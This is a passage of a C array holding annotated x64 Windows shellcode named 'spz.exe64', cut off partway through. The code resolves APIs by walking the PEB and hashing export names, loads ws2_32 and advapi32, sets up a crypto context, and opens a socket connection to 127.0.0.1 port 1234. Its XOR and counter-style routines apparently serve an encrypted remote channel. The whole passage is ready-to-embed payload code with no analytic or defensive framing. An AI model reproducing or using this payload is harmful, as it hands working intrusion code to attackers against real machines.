
#define spz.exe64_SIZE 7470

char spz.exe64[]= {
  /* 0000 */ "\x48\x8b\xc4"                             /* mov rax, rsp                       */
  /* 0003 */ "\x48\x89\x58\x10"                         /* mov [rax+0x10], rbx                */
  /* 0007 */ "\x48\x89\x70\x18"                         /* mov [rax+0x18], rsi                */
  /* 000B */ "\x48\x89\x78\x20"                         /* mov [rax+0x20], rdi                */
  /* 000F */ "\x55"                                     /* push rbp                           */
  /* 0010 */ "\x48\x8d\xa8\x08\xea\xff\xff"             /* lea rbp, [rax-0x15f8]              */
  /* 0017 */ "\xb8\xf0\x16\x00\x00"                     /* mov eax, 0x16f0                    */
  /* 001C */ "\xe8\xbf\x1c\x00\x00"                     /* call 0x1ce0                        */
  /* 0021 */ "\x48\x2b\xe0"                             /* sub rsp, rax                       */
  /* 0024 */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 0026 */ "\x48\x8d\xbd\x60\x01\x00\x00"             /* lea rdi, [rbp+0x160]               */
  /* 002D */ "\xb9\x90\x14\x00\x00"                     /* mov ecx, 0x1490                    */
  /* 0032 */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 0034 */ "\xb9\xed\x28\x3b\x7c"                     /* mov ecx, 0x7c3b28ed                */
  /* 0039 */ "\xc7\x85\x00\x16\x00\x00\x77\x73\x32\x5f" /* mov dword [rbp+0x1600], 0x5f327377 */
  /* 0043 */ "\x66\xc7\x85\x04\x16\x00\x00\x33\x32"     /* mov word [rbp+0x1604], 0x3233      */
  /* 004C */ "\xc6\x85\x06\x16\x00\x00\x00"             /* mov byte [rbp+0x1606], 0x0         */
  /* 0053 */ "\xc7\x44\x24\x30\x61\x64\x76\x61"         /* mov dword [rsp+0x30], 0x61766461   */
  /* 005B */ "\xc7\x44\x24\x34\x70\x69\x33\x32"         /* mov dword [rsp+0x34], 0x32336970   */
  /* 0063 */ "\xc6\x44\x24\x38\x00"                     /* mov byte [rsp+0x38], 0x0           */
  /* 0068 */ "\xc7\x44\x24\x40\xa9\x3e\x1d\x9b"         /* mov dword [rsp+0x40], 0x9b1d3ea9   */
  /* 0070 */ "\xc7\x44\x24\x44\xbf\x65\xfa\xe6"         /* mov dword [rsp+0x44], 0xe6fa65bf   */
  /* 0078 */ "\xc7\x44\x24\x48\x0c\xee\xee\x0b"         /* mov dword [rsp+0x48], 0xbeeee0c    */
  /* 0080 */ "\xc7\x44\x24\x4c\x5f\x4f\xf7\xd7"         /* mov dword [rsp+0x4c], 0xd7f74f5f   */
  /* 0088 */ "\xc7\x44\x24\x50\x55\x3f\xe7\xe0"         /* mov dword [rsp+0x50], 0xe0e73f55   */
  /* 0090 */ "\xc7\x44\x24\x54\x3b\xb3\x74\x58"         /* mov dword [rsp+0x54], 0x5874b33b   */
  /* 0098 */ "\xc7\x44\x24\x58\xd1\xd8\xa0\xb6"         /* mov dword [rsp+0x58], 0xb6a0d8d1   */
  /* 00A0 */ "\xc7\x44\x24\x5c\xc6\x8f\x22\x09"         /* mov dword [rsp+0x5c], 0x9228fc6    */
  /* 00A8 */ "\xc7\x44\x24\x60\xf0\x88\xf1\xc0"         /* mov dword [rsp+0x60], 0xc0f188f0   */
  /* 00B0 */ "\xc7\x44\x24\x64\x63\xd1\xc0\xa7"         /* mov dword [rsp+0x64], 0xa7c0d163   */
  /* 00B8 */ "\xc7\x44\x24\x68\xa5\xef\x08\x26"         /* mov dword [rsp+0x68], 0x2608efa5   */
  /* 00C0 */ "\xc7\x44\x24\x6c\x52\x6e\xea\x9f"         /* mov dword [rsp+0x6c], 0x9fea6e52   */
  /* 00C8 */ "\xc7\x44\x24\x70\x63\x2c\x68\xb4"         /* mov dword [rsp+0x70], 0xb4682c63   */
  /* 00D0 */ "\xc7\x44\x24\x74\xc6\xb2\x1b\xca"         /* mov dword [rsp+0x74], 0xca1bb2c6   */
  /* 00D8 */ "\xc7\x44\x24\x78\x3e\xc4\x7c\x72"         /* mov dword [rsp+0x78], 0x727cc43e   */
  /* 00E0 */ "\xc7\x44\x24\x7c\x34\x03\x92\x9d"         /* mov dword [rsp+0x7c], 0x9d920334   */
  /* 00E8 */ "\xc7\x45\x80\xb2\xf1\x0d\xb5"             /* mov dword [rbp-0x80], 0xb50df1b2   */
  /* 00EF */ "\xc7\x45\x84\x6a\x11\xd3\x3d"             /* mov dword [rbp-0x7c], 0x3dd3116a   */
  /* 00F6 */ "\xc7\x45\x88\x7c\x11\x7b\x3b"             /* mov dword [rbp-0x78], 0x3b7b117c   */
  /* 00FD */ "\xc7\x45\x8c\xad\x71\x29\xce"             /* mov dword [rbp-0x74], 0xce2971ad   */
  /* 0104 */ "\xc7\x45\x90\xce\x89\x45\x42"             /* mov dword [rbp-0x70], 0x424589ce   */
  /* 010B */ "\xc7\x45\x94\xbe\x26\x97\x92"             /* mov dword [rbp-0x6c], 0x929726be   */
  /* 0112 */ "\xc7\x45\x98\x3f\x06\x2c\x27"             /* mov dword [rbp-0x68], 0x272c063f   */
  /* 0119 */ "\xc7\x45\x9c\x16\x05\xef\x26"             /* mov dword [rbp-0x64], 0x26ef0516   */
  /* 0120 */ "\xc7\x45\xa0\x91\xe9\xe0\xb0"             /* mov dword [rbp-0x60], 0xb0e0e991   */
  /* 0127 */ "\xc7\x45\xa4\x99\x47\x90\x86"             /* mov dword [rbp-0x5c], 0x86904799   */
  /* 012E */ "\xc7\x45\xa8\x22\xd5\x78\xbd"             /* mov dword [rbp-0x58], 0xbd78d522   */
  /* 0135 */ "\xc7\x45\xac\x33\xe0\x35\xb6"             /* mov dword [rbp-0x54], 0xb635e033   */
  /* 013C */ "\xe8\xfb\x00\x00\x00"                     /* call 0x23c                         */
  /* 0141 */ "\x48\x8d\x8d\x00\x16\x00\x00"             /* lea rcx, [rbp+0x1600]              */
  /* 0148 */ "\x48\x8b\xf8"                             /* mov rdi, rax                       */
  /* 014B */ "\xff\xd7"                                 /* call rdi                           */
  /* 014D */ "\x48\x8d\x4c\x24\x30"                     /* lea rcx, [rsp+0x30]                */
  /* 0152 */ "\xff\xd7"                                 /* call rdi                           */
  /* 0154 */ "\x48\x8d\xbd\x60\x01\x00\x00"             /* lea rdi, [rbp+0x160]               */
  /* 015B */ "\x48\x8d\x5c\x24\x40"                     /* lea rbx, [rsp+0x40]                */
  /* 0160 */ "\xbe\x1c\x00\x00\x00"                     /* mov esi, 0x1c                      */
  /* 0165 */ "\x8b\x0b"                                 /* mov ecx, [rbx]                     */
  /* 0167 */ "\xe8\xd0\x00\x00\x00"                     /* call 0x23c                         */
  /* 016C */ "\x48\x83\xc3\x04"                         /* add rbx, 0x4                       */
  /* 0170 */ "\x48\x89\x07"                             /* mov [rdi], rax                     */
  /* 0173 */ "\x48\x83\xc7\x08"                         /* add rdi, 0x8                       */
  /* 0177 */ "\x48\xff\xce"                             /* dec rsi                            */
  /* 017A */ "\x75\xe9"                                 /* jnz 0x165                          */
  /* 017C */ "\x48\x8d\x55\xc0"                         /* lea rdx, [rbp-0x40]                */
  /* 0180 */ "\xb9\x02\x02\x00\x00"                     /* mov ecx, 0x202                     */
  /* 0185 */ "\xff\x95\x20\x02\x00\x00"                 /* call qword [rbp+0x220]             */
  /* 018B */ "\x48\x21\xb5\xb8\x0a\x00\x00"             /* and [rbp+0xab8], rsi               */
  /* 0192 */ "\x44\x8d\x4e\x18"                         /* lea r9d, [rsi+0x18]                */
  /* 0196 */ "\x48\x8d\x8d\xb8\x0a\x00\x00"             /* lea rcx, [rbp+0xab8]               */
  /* 019D */ "\x45\x33\xc0"                             /* xor r8d, r8d                       */
  /* 01A0 */ "\x33\xd2"                                 /* xor edx, edx                       */
  /* 01A2 */ "\xc7\x44\x24\x20\x40\x00\x00\xf0"         /* mov dword [rsp+0x20], 0xf0000040   */
  /* 01AA */ "\xff\x95\x28\x02\x00\x00"                 /* call qword [rbp+0x228]             */
  /* 01B0 */ "\x8d\x7e\x02"                             /* lea edi, [rsi+0x2]                 */
  /* 01B3 */ "\x8d\x56\x01"                             /* lea edx, [rsi+0x1]                 */
  /* 01B6 */ "\x44\x8d\x46\x06"                         /* lea r8d, [rsi+0x6]                 */
  /* 01BA */ "\x8b\xcf"                                 /* mov ecx, edi                       */
  /* 01BC */ "\xff\x95\xd8\x01\x00\x00"                 /* call qword [rbp+0x1d8]             */
  /* 01C2 */ "\x44\x8d\x46\x10"                         /* lea r8d, [rsi+0x10]                */
  /* 01C6 */ "\x48\x8d\x55\xb0"                         /* lea rdx, [rbp-0x50]                */
  /* 01CA */ "\x48\x8b\xc8"                             /* mov rcx, rax                       */
  /* 01CD */ "\xc7\x45\xb0\x02\x00\x04\xd2"             /* mov dword [rbp-0x50], 0xd2040002   */
  /* 01D4 */ "\xc7\x45\xb4\x7f\x00\x00\x01"             /* mov dword [rbp-0x4c], 0x100007f    */
  /* 01DB */ "\x48\x89\x85\x60\x0a\x00\x00"             /* mov [rbp+0xa60], rax               */
  /* 01E2 */ "\xff\x95\xe0\x01\x00\x00"                 /* call qword [rbp+0x1e0]             */
  /* 01E8 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 01EA */ "\x75\x18"                                 /* jnz 0x204                          */
  /* 01EC */ "\x48\x8d\x8d\x60\x01\x00\x00"             /* lea rcx, [rbp+0x160]               */
  /* 01F3 */ "\xe8\x58\x07\x00\x00"                     /* call 0x950                         */
  /* 01F8 */ "\x48\x8d\x8d\x60\x01\x00\x00"             /* lea rcx, [rbp+0x160]               */
  /* 01FF */ "\xe8\xdc\x0d\x00\x00"                     /* call 0xfe0                         */
  /* 0204 */ "\x48\x8b\x8d\x60\x0a\x00\x00"             /* mov rcx, [rbp+0xa60]               */
  /* 020B */ "\xff\x95\xf8\x01\x00\x00"                 /* call qword [rbp+0x1f8]             */
  /* 0211 */ "\x48\x8b\x8d\xb8\x0a\x00\x00"             /* mov rcx, [rbp+0xab8]               */
  /* 0218 */ "\x33\xd2"                                 /* xor edx, edx                       */
  /* 021A */ "\xff\x95\x38\x02\x00\x00"                 /* call qword [rbp+0x238]             */
  /* 0220 */ "\x4c\x8d\x9c\x24\xf0\x16\x00\x00"         /* lea r11, [rsp+0x16f0]              */
  /* 0228 */ "\x49\x8b\x5b\x18"                         /* mov rbx, [r11+0x18]                */
  /* 022C */ "\x49\x8b\x73\x20"                         /* mov rsi, [r11+0x20]                */
  /* 0230 */ "\x49\x8b\x7b\x28"                         /* mov rdi, [r11+0x28]                */
  /* 0234 */ "\x49\x8b\xe3"                             /* mov rsp, r11                       */
  /* 0237 */ "\x5d"                                     /* pop rbp                            */
  /* 0238 */ "\xc3"                                     /* ret                                */
  /* 0239 */ "\xcc"                                     /* int3                               */
  /* 023A */ "\xcc"                                     /* int3                               */
  /* 023B */ "\xcc"                                     /* int3                               */
  /* 023C */ "\x48\x89\x5c\x24\x20"                     /* mov [rsp+0x20], rbx                */
  /* 0241 */ "\x89\x4c\x24\x08"                         /* mov [rsp+0x8], ecx                 */
  /* 0245 */ "\x55"                                     /* push rbp                           */
  /* 0246 */ "\x56"                                     /* push rsi                           */
  /* 0247 */ "\x57"                                     /* push rdi                           */
  /* 0248 */ "\x48\x81\xec\xe0\x00\x00\x00"             /* sub rsp, 0xe0                      */
  /* 024F */ "\x65\x48\x8b\x04\x25\x60\x00\x00\x00"     /* mov rax, [gs:0x60]                 */
  /* 0258 */ "\x45\x33\xc0"                             /* xor r8d, r8d                       */
  /* 025B */ "\x48\x8b\x50\x18"                         /* mov rdx, [rax+0x18]                */
  /* 025F */ "\x48\x8b\x5a\x10"                         /* mov rbx, [rdx+0x10]                */
  /* 0263 */ "\xe9\xb4\x01\x00\x00"                     /* jmp 0x41c                          */
  /* 0268 */ "\x48\x63\x7a\x3c"                         /* movsxd rdi, dword [rdx+0x3c]       */
  /* 026C */ "\x8b\x84\x17\x88\x00\x00\x00"             /* mov eax, [rdi+rdx+0x88]            */
  /* 0273 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 0275 */ "\x0f\x84\x9e\x01\x00\x00"                 /* jz 0x419                           */
  /* 027B */ "\x48\x8d\x34\x02"                         /* lea rsi, [rdx+rax]                 */
  /* 027F */ "\x8b\x46\x1c"                             /* mov eax, [rsi+0x1c]                */
  /* 0282 */ "\x44\x8b\x56\x20"                         /* mov r10d, [rsi+0x20]               */
  /* 0286 */ "\x8b\x4e\x0c"                             /* mov ecx, [rsi+0xc]                 */
  /* 0289 */ "\x4c\x63\x4e\x18"                         /* movsxd r9, dword [rsi+0x18]        */
  /* 028D */ "\x48\x03\xc2"                             /* add rax, rdx                       */
  /* 0290 */ "\x4c\x03\xd2"                             /* add r10, rdx                       */
  /* 0293 */ "\x48\x89\x84\x24\x10\x01\x00\x00"         /* mov [rsp+0x110], rax               */
  /* 029B */ "\x8b\x46\x24"                             /* mov eax, [rsi+0x24]                */
  /* 029E */ "\x48\x03\xca"                             /* add rcx, rdx                       */
  /* 02A1 */ "\x48\x03\xc2"                             /* add rax, rdx                       */
  /* 02A4 */ "\x33\xed"                                 /* xor ebp, ebp                       */
  /* 02A6 */ "\x48\x89\x84\x24\x08\x01\x00\x00"         /* mov [rsp+0x108], rax               */
  /* 02AE */ "\xeb\x0e"                                 /* jmp 0x2be                          */
  /* 02B0 */ "\xc1\xcd\x0d"                             /* ror ebp, 0xd                       */
  /* 02B3 */ "\x0f\xbe\xc0"                             /* movsx eax, al                      */
  /* 02B6 */ "\x83\xc8\x20"                             /* or eax, 0x20                       */
  /* 02B9 */ "\x03\xe8"                                 /* add ebp, eax                       */
  /* 02BB */ "\x48\xff\xc1"                             /* inc rcx                            */
  /* 02BE */ "\x8a\x01"                                 /* mov al, [rcx]                      */
  /* 02C0 */ "\x84\xc0"                                 /* test al, al                        */
  /* 02C2 */ "\x75\xec"                                 /* jnz 0x2b0                          */
  /* 02C4 */ "\x49\x8b\xc1"                             /* mov rax, r9                        */
  /* 02C7 */ "\x4f\x8d\x54\x8a\xfc"                     /* lea r10, [r10+r9*4-0x4]            */
  /* 02CC */ "\x41\x8b\x0a"                             /* mov ecx, [r10]                     */
  /* 02CF */ "\x48\x03\xca"                             /* add rcx, rdx                       */
  /* 02D2 */ "\x45\x33\xdb"                             /* xor r11d, r11d                     */
  /* 02D5 */ "\xeb\x10"                                 /* jmp 0x2e7                          */
  /* 02D7 */ "\x41\xc1\xcb\x0d"                         /* ror r11d, 0xd                      */
  /* 02DB */ "\x0f\xbe\xc0"                             /* movsx eax, al                      */
  /* 02DE */ "\x83\xc8\x20"                             /* or eax, 0x20                       */
  /* 02E1 */ "\x44\x03\xd8"                             /* add r11d, eax                      */
  /* 02E4 */ "\x48\xff\xc1"                             /* inc rcx                            */
  /* 02E7 */ "\x8a\x01"                                 /* mov al, [rcx]                      */
  /* 02E9 */ "\x84\xc0"                                 /* test al, al                        */
  /* 02EB */ "\x75\xea"                                 /* jnz 0x2d7                          */
  /* 02ED */ "\x41\x8d\x04\x2b"                         /* lea eax, [r11+rbp]                 */
  /* 02F1 */ "\x3b\x84\x24\x00\x01\x00\x00"             /* cmp eax, [rsp+0x100]               */
  /* 02F8 */ "\x74\x18"                                 /* jz 0x312                           */
  /* 02FA */ "\x49\x83\xea\x04"                         /* sub r10, 0x4                       */
  /* 02FE */ "\x41\xff\xc9"                             /* dec r9d                            */
  /* 0301 */ "\x0f\x84\x0d\x01\x00\x00"                 /* jz 0x414                           */
  /* 0307 */ "\x4d\x85\xc0"                             /* test r8, r8                        */
  /* 030A */ "\x0f\x85\x19\x01\x00\x00"                 /* jnz 0x429                          */
  /* 0310 */ "\xeb\xba"                                 /* jmp 0x2cc                          */
  /* 0312 */ "\x48\x8b\x84\x24\x08\x01\x00\x00"         /* mov rax, [rsp+0x108]               */
  /* 031A */ "\x41\x8d\x49\xff"                         /* lea ecx, [r9-0x1]                  */
  /* 031E */ "\x0f\xb7\x04\x48"                         /* movzx eax, word [rax+rcx*2]        */
  /* 0322 */ "\x48\x8b\x8c\x24\x10\x01\x00\x00"         /* mov rcx, [rsp+0x110]               */
  /* 032A */ "\x44\x8b\x04\x81"                         /* mov r8d, [rcx+rax*4]               */
  /* 032E */ "\x4c\x03\xc2"                             /* add r8, rdx                        */
  /* 0331 */ "\x4c\x3b\xc6"                             /* cmp r8, rsi                        */
  /* 0334 */ "\x0f\x82\xda\x00\x00\x00"                 /* jb 0x414                           */
  /* 033A */ "\x8b\x84\x17\x8c\x00\x00\x00"             /* mov eax, [rdi+rdx+0x8c]            */
  /* 0341 */ "\x48\x03\xc6"                             /* add rax, rsi                       */
  /* 0344 */ "\x4c\x3b\xc0"                             /* cmp r8, rax                        */
  /* 0347 */ "\x0f\x83\xc7\x00\x00\x00"                 /* jae 0x414                          */
  /* 034D */ "\x45\x33\xdb"                             /* xor r11d, r11d                     */
  /* 0350 */ "\x45\x8b\xcb"                             /* mov r9d, r11d                      */
  /* 0353 */ "\x41\x8b\xcb"                             /* mov ecx, r11d                      */
  /* 0356 */ "\x45\x38\x18"                             /* cmp [r8], r11b                     */
  /* 0359 */ "\x74\x29"                                 /* jz 0x384                           */
  /* 035B */ "\x4c\x8d\x54\x24\x20"                     /* lea r10, [rsp+0x20]                */
  /* 0360 */ "\x49\x8b\xd0"                             /* mov rdx, r8                        */
  /* 0363 */ "\x4d\x2b\xd0"                             /* sub r10, r8                        */
  /* 0366 */ "\x41\x83\xf9\x3c"                         /* cmp r9d, 0x3c                      */
  /* 036A */ "\x73\x18"                                 /* jae 0x384                          */
  /* 036C */ "\x8a\x02"                                 /* mov al, [rdx]                      */
  /* 036E */ "\x41\x88\x04\x12"                         /* mov [r10+rdx], al                  */
  /* 0372 */ "\x3c\x2e"                                 /* cmp al, 0x2e                       */
  /* 0374 */ "\x74\x0e"                                 /* jz 0x384                           */
  /* 0376 */ "\x48\xff\xc2"                             /* inc rdx                            */
  /* 0379 */ "\x41\xff\xc1"                             /* inc r9d                            */
  /* 037C */ "\x48\xff\xc1"                             /* inc rcx                            */
  /* 037F */ "\x44\x38\x1a"                             /* cmp [rdx], r11b                    */
  /* 0382 */ "\x75\xe2"                                 /* jnz 0x366                          */
  /* 0384 */ "\xc6\x44\x0c\x21\x44"                     /* mov byte [rsp+rcx+0x21], 0x44      */
  /* 0389 */ "\xc6\x44\x0c\x22\x4c"                     /* mov byte [rsp+rcx+0x22], 0x4c      */
  /* 038E */ "\xc6\x44\x0c\x23\x4c"                     /* mov byte [rsp+rcx+0x23], 0x4c      */
  /* 0393 */ "\x44\x88\x5c\x0c\x24"                     /* mov [rsp+rcx+0x24], r11b           */
  /* 0398 */ "\x48\xff\xc1"                             /* inc rcx                            */
  /* 039B */ "\x45\x8b\xcb"                             /* mov r9d, r11d                      */
  /* 039E */ "\x4a\x8d\x14\x01"                         /* lea rdx, [rcx+r8]                  */
  /* 03A2 */ "\x49\x8b\xc3"                             /* mov rax, r11                       */
  /* 03A5 */ "\xeb\x13"                                 /* jmp 0x3ba                          */
  /* 03A7 */ "\x41\x83\xf9\x7f"                         /* cmp r9d, 0x7f                      */
  /* 03AB */ "\x73\x13"                                 /* jae 0x3c0                          */
  /* 03AD */ "\x88\x4c\x04\x60"                         /* mov [rsp+rax+0x60], cl             */
  /* 03B1 */ "\x48\xff\xc0"                             /* inc rax                            */
  /* 03B4 */ "\x41\xff\xc1"                             /* inc r9d                            */
  /* 03B7 */ "\x48\xff\xc2"                             /* inc rdx                            */
  /* 03BA */ "\x8a\x0a"                                 /* mov cl, [rdx]                      */
  /* 03BC */ "\x84\xc9"                                 /* test cl, cl                        */
  /* 03BE */ "\x75\xe7"                                 /* jnz 0x3a7                          */
  /* 03C0 */ "\x44\x88\x5c\x04\x60"                     /* mov [rsp+rax+0x60], r11b           */
  /* 03C5 */ "\x8a\x44\x24\x20"                         /* mov al, [rsp+0x20]                 */
  /* 03C9 */ "\x48\x8d\x4c\x24\x20"                     /* lea rcx, [rsp+0x20]                */
  /* 03CE */ "\x41\x8b\xd3"                             /* mov edx, r11d                      */
  /* 03D1 */ "\xeb\x10"                                 /* jmp 0x3e3                          */
  /* 03D3 */ "\x0f\xbe\xc0"                             /* movsx eax, al                      */
  /* 03D6 */ "\xc1\xca\x0d"                             /* ror edx, 0xd                       */
  /* 03D9 */ "\x83\xc8\x20"                             /* or eax, 0x20                       */
  /* 03DC */ "\x03\xd0"                                 /* add edx, eax                       */
  /* 03DE */ "\x48\xff\xc1"                             /* inc rcx                            */
  /* 03E1 */ "\x8a\x01"                                 /* mov al, [rcx]                      */
  /* 03E3 */ "\x84\xc0"                                 /* test al, al                        */
  /* 03E5 */ "\x75\xec"                                 /* jnz 0x3d3                          */
  /* 03E7 */ "\x8a\x44\x24\x60"                         /* mov al, [rsp+0x60]                 */
  /* 03EB */ "\x4c\x8d\x44\x24\x60"                     /* lea r8, [rsp+0x60]                 */
  /* 03F0 */ "\x41\x8b\xcb"                             /* mov ecx, r11d                      */
  /* 03F3 */ "\xeb\x11"                                 /* jmp 0x406                          */
  /* 03F5 */ "\x0f\xbe\xc0"                             /* movsx eax, al                      */
  /* 03F8 */ "\xc1\xc9\x0d"                             /* ror ecx, 0xd                       */
  /* 03FB */ "\x83\xc8\x20"                             /* or eax, 0x20                       */
  /* 03FE */ "\x03\xc8"                                 /* add ecx, eax                       */
  /* 0400 */ "\x49\xff\xc0"                             /* inc r8                             */
  /* 0403 */ "\x41\x8a\x00"                             /* mov al, [r8]                       */
  /* 0406 */ "\x84\xc0"                                 /* test al, al                        */
  /* 0408 */ "\x75\xeb"                                 /* jnz 0x3f5                          */
  /* 040A */ "\x03\xca"                                 /* add ecx, edx                       */
  /* 040C */ "\xe8\x2b\xfe\xff\xff"                     /* call 0x23c                         */
  /* 0411 */ "\x4c\x8b\xc0"                             /* mov r8, rax                        */
  /* 0414 */ "\x4d\x85\xc0"                             /* test r8, r8                        */
  /* 0417 */ "\x75\x10"                                 /* jnz 0x429                          */
  /* 0419 */ "\x48\x8b\x1b"                             /* mov rbx, [rbx]                     */
  /* 041C */ "\x48\x8b\x53\x30"                         /* mov rdx, [rbx+0x30]                */
  /* 0420 */ "\x48\x85\xd2"                             /* test rdx, rdx                      */
  /* 0423 */ "\x0f\x85\x3f\xfe\xff\xff"                 /* jnz 0x268                          */
  /* 0429 */ "\x49\x8b\xc0"                             /* mov rax, r8                        */
  /* 042C */ "\x48\x8b\x9c\x24\x18\x01\x00\x00"         /* mov rbx, [rsp+0x118]               */
  /* 0434 */ "\x48\x81\xc4\xe0\x00\x00\x00"             /* add rsp, 0xe0                      */
  /* 043B */ "\x5f"                                     /* pop rdi                            */
  /* 043C */ "\x5e"                                     /* pop rsi                            */
  /* 043D */ "\x5d"                                     /* pop rbp                            */
  /* 043E */ "\xc3"                                     /* ret                                */
  /* 043F */ "\xcc"                                     /* int3                               */
  /* 0440 */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 0445 */ "\x48\x89\x6c\x24\x10"                     /* mov [rsp+0x10], rbp                */
  /* 044A */ "\x48\x89\x74\x24\x18"                     /* mov [rsp+0x18], rsi                */
  /* 044F */ "\x57"                                     /* push rdi                           */
  /* 0450 */ "\x48\x81\xec\x20\x01\x00\x00"             /* sub rsp, 0x120                     */
  /* 0457 */ "\x48\x8b\xf9"                             /* mov rdi, rcx                       */
  /* 045A */ "\x48\x8b\xda"                             /* mov rbx, rdx                       */
  /* 045D */ "\x48\x8d\x4c\x24\x40"                     /* lea rcx, [rsp+0x40]                */
  /* 0462 */ "\xba\x20\x00\x00\x00"                     /* mov edx, 0x20                      */
  /* 0467 */ "\x49\x8b\xe9"                             /* mov rbp, r9                        */
  /* 046A */ "\x41\x8b\xf0"                             /* mov esi, r8d                       */
  /* 046D */ "\xe8\x0e\x0f\x00\x00"                     /* call 0x1380                        */
  /* 0472 */ "\x48\x8d\x97\x90\x09\x00\x00"             /* lea rdx, [rdi+0x990]               */
  /* 0479 */ "\x48\x8d\x4c\x24\x40"                     /* lea rcx, [rsp+0x40]                */
  /* 047E */ "\x41\xb8\x10\x00\x00\x00"                 /* mov r8d, 0x10                      */
  /* 0484 */ "\xe8\x23\x0f\x00\x00"                     /* call 0x13ac                        */
  /* 0489 */ "\x48\x8d\x4c\x24\x40"                     /* lea rcx, [rsp+0x40]                */
  /* 048E */ "\x44\x8b\xc6"                             /* mov r8d, esi                       */
  /* 0491 */ "\x48\x8b\xd3"                             /* mov rdx, rbx                       */
  /* 0494 */ "\xe8\x13\x0f\x00\x00"                     /* call 0x13ac                        */
  /* 0499 */ "\x48\x8d\x54\x24\x40"                     /* lea rdx, [rsp+0x40]                */
  /* 049E */ "\x48\x8d\x4c\x24\x20"                     /* lea rcx, [rsp+0x20]                */
  /* 04A3 */ "\xe8\x5c\x0f\x00\x00"                     /* call 0x1404                        */
  /* 04A8 */ "\x4c\x8d\x9c\x24\x20\x01\x00\x00"         /* lea r11, [rsp+0x120]               */
  /* 04B0 */ "\x48\x8b\xfd"                             /* mov rdi, rbp                       */
  /* 04B3 */ "\x49\x8b\x5b\x10"                         /* mov rbx, [r11+0x10]                */
  /* 04B7 */ "\x49\x8b\x6b\x18"                         /* mov rbp, [r11+0x18]                */
  /* 04BB */ "\x48\x8d\x74\x24\x20"                     /* lea rsi, [rsp+0x20]                */
  /* 04C0 */ "\xb9\x0c\x00\x00\x00"                     /* mov ecx, 0xc                       */
  /* 04C5 */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 04C7 */ "\x49\x8b\x73\x20"                         /* mov rsi, [r11+0x20]                */
  /* 04CB */ "\x49\x8b\xe3"                             /* mov rsp, r11                       */
  /* 04CE */ "\x5f"                                     /* pop rdi                            */
  /* 04CF */ "\xc3"                                     /* ret                                */
  /* 04D0 */ "\x41\x8b\xc0"                             /* mov eax, r8d                       */
  /* 04D3 */ "\x4c\x8b\xc1"                             /* mov r8, rcx                        */
  /* 04D6 */ "\xb9\x10\x00\x00\x00"                     /* mov ecx, 0x10                      */
  /* 04DB */ "\x3b\xc1"                                 /* cmp eax, ecx                       */
  /* 04DD */ "\x4c\x8b\xca"                             /* mov r9, rdx                        */
  /* 04E0 */ "\x0f\x47\xc1"                             /* cmova eax, ecx                     */
  /* 04E3 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 04E5 */ "\x74\x14"                                 /* jz 0x4fb                           */
  /* 04E7 */ "\x4d\x2b\xc8"                             /* sub r9, r8                         */
  /* 04EA */ "\x8b\xd0"                                 /* mov edx, eax                       */
  /* 04EC */ "\x43\x8a\x0c\x01"                         /* mov cl, [r9+r8]                    */
  /* 04F0 */ "\x41\x30\x08"                             /* xor [r8], cl                       */
  /* 04F3 */ "\x49\xff\xc0"                             /* inc r8                             */
  /* 04F6 */ "\x48\xff\xca"                             /* dec rdx                            */
  /* 04F9 */ "\x75\xf1"                                 /* jnz 0x4ec                          */
  /* 04FB */ "\xf3\xc3"                                 /* repe ret                           */
  /* 04FD */ "\xcc"                                     /* int3                               */
  /* 04FE */ "\xcc"                                     /* int3                               */
  /* 04FF */ "\xcc"                                     /* int3                               */
  /* 0500 */ "\x45\x85\xc0"                             /* test r8d, r8d                      */
  /* 0503 */ "\x0f\x84\xa6\x00\x00\x00"                 /* jz 0x5af                           */
  /* 0509 */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 050E */ "\x48\x89\x6c\x24\x10"                     /* mov [rsp+0x10], rbp                */
  /* 0513 */ "\x48\x89\x74\x24\x18"                     /* mov [rsp+0x18], rsi                */
  /* 0518 */ "\x57"                                     /* push rdi                           */
  /* 0519 */ "\x41\x54"                                 /* push r12                           */
  /* 051B */ "\x41\x55"                                 /* push r13                           */
  /* 051D */ "\x41\x56"                                 /* push r14                           */
  /* 051F */ "\x41\x57"                                 /* push r15                           */
  /* 0521 */ "\x48\x83\xec\x30"                         /* sub rsp, 0x30                      */
  /* 0525 */ "\x4c\x8d\xa9\x80\x09\x00\x00"             /* lea r13, [rcx+0x980]               */
  /* 052C */ "\x41\x8b\xd8"                             /* mov ebx, r8d                       */
  /* 052F */ "\x4c\x8b\xe2"                             /* mov r12, rdx                       */
  /* 0532 */ "\x49\x8b\xed"                             /* mov rbp, r13                       */
  /* 0535 */ "\x4c\x8d\xb1\xa0\x11\x00\x00"             /* lea r14, [rcx+0x11a0]              */
  /* 053C */ "\x48\xf7\xdd"                             /* neg rbp                            */
  /* 053F */ "\x48\x8d\x7c\x24\x20"                     /* lea rdi, [rsp+0x20]                */
  /* 0544 */ "\x49\x8b\xf5"                             /* mov rsi, r13                       */
  /* 0547 */ "\xb9\x10\x00\x00\x00"                     /* mov ecx, 0x10                      */
  /* 054C */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 054E */ "\x48\x8d\x54\x24\x20"                     /* lea rdx, [rsp+0x20]                */
  /* 0553 */ "\x48\x8d\x4c\x24\x20"                     /* lea rcx, [rsp+0x20]                */
  /* 0558 */ "\x41\xb9\x01\x00\x00\x00"                 /* mov r9d, 0x1                       */
  /* 055E */ "\x4d\x8b\xc6"                             /* mov r8, r14                        */
  /* 0561 */ "\xe8\xfe\x11\x00\x00"                     /* call 0x1764                        */
  /* 0566 */ "\x48\x8d\x54\x24\x20"                     /* lea rdx, [rsp+0x20]                */
  /* 056B */ "\x44\x8b\xc3"                             /* mov r8d, ebx                       */
  /* 056E */ "\x49\x8b\xcc"                             /* mov rcx, r12                       */
  /* 0571 */ "\xe8\x5a\xff\xff\xff"                     /* call 0x4d0                         */
  /* 0576 */ "\x49\x8d\x55\x0f"                         /* lea rdx, [r13+0xf]                 */
  /* 057A */ "\xfe\x02"                                 /* inc byte [rdx]                     */
  /* 057C */ "\x75\x0c"                                 /* jnz 0x58a                          */
  /* 057E */ "\x48\xff\xca"                             /* dec rdx                            */
